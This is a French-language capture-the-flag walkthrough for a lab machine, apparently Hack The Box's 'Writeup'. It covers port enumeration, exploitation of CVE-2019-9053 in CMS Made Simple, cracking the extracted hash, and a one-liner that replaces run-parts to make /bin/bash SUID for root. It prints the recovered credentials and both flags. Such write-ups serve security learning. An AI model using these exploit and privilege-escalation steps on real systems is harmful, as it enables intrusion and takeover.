# Target : 10.129.65.246

# Enumeration des ports ouverts et leur version

```js
nmap -sV -sC 10.129.65.246
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 15:26 +0000
Nmap scan report for 10.129.65.246
Host is up (0.31s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.11 seconds
```

# Enumeration du port 80   'Apache httpd 2.4.25'

![](/assets/Pasted-image-20260808153119.png)


```js
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

![](/assets/Pasted-image-20260808154628.png)


# Check de la techno qui tourne derriere

```js
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  CMS Scan Results  [+] 

 ┏━Target: 10.129.65.246
 ┃
 ┠── CMS: CMS Made Simple
 ┃    │
 ┃    ╰── URL: https://cmsmadesimple.org
 ┃
 ┠── Result: /home/amogus/Téléchargements/TRACKS/Result/10.129.65.246_writeup/cms.json
 ┃
 ┗━Scan Completed in 0.85 Seconds, using 1 Requests

```

En checkant le code source j'ai trouver la date de deploiement de ce cms `CMS Made Simple - Copyright (C) 2004-2019`
Ce dernier est vuln a une CVE 

`CMS Made Simple versions up to 2.2.8 and 2.2.10 are affected by a critical unauthenticated time-based SQL injection vulnerability tracked as [CVE-2019-9053](https://github.com/advisories/GHSA-rrqg-2h39-2567) via the News module parameter `m1_idlist`. This flaw allows remote attackers to extract sensitive data like administrator credentials.`
## PoC : [url: https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit/blob/main/readme.md]

```js
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htbJt
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

Vu que le mot de passe est sale je vais alors le reecrire pour que `john` puisse le cracker

```js
jkr:$dynamic_4$62def4866937f08cc13bab43bb14e6f7$5a599ef579066807
```

```js
jkr:raykayjay9
```

# User.txt : 5f49d186be7ad3ed9467d745bf387cf6

```js
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```

Creer une autre conexion ssh
```js
/bin/bash
```

# Root.txt : 90ce2695ad32dbf0494d5b23d4aa9d8f